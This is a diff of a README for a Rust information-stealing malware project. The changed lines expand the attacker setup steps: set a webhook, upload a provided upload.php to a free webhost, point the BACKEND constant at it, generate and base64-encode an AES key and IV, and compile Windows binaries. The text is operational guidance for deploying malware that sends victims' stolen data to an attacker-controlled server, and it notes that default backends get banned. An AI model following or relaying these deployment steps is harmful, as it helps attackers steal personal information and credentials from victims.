@@ -26,10 +26,14 @@ This is a malware written in Rust that steals the information the attacker choos
 1. Open it in VS Code or your preferred IDE
 2. Goto `constants.rs` and find the `WEBHOOK` field
 3. Set the webhook to your webhook
-4. Make sure to change the encryption key and iv in `encryption-macro/src/lib.rs` and the `upload.php` on your backend
-5. Make sure to change the `BACKEND` since the default one will probably get banned at some point
-6. Set the options in `constants.rs`
-7. Run (x64) `cargo build --release` or (x86) `cargo build --release --target=i686-pc-windows-msvc`
+4. Get a webhost you can get a free one from [here](https://www.000webhost.com/)
+5. Get the `assets/upload.php` and upload it to your webhost
+6. Change the `BACKEND` in `src/constants.rs` to yours
+7. Get a 256-bit and a 128-bit iv from [here](https://www.allkeysgenerator.com/Random/Security-Encryption-Key-Generator.aspx)
+8. Convert both of them to base64 [here](https://www.base64encode.org/)
+9. Use those values in `encryption-macro/src/lib.rs` and the `upload.php` on your backend
+10. Set the options you want in `constants.rs`
+11. Run (x64) `cargo build --release` or (x86) `cargo build --release --target=i686-pc-windows-msvc`
 
 ### Contributing
 1. Fork it
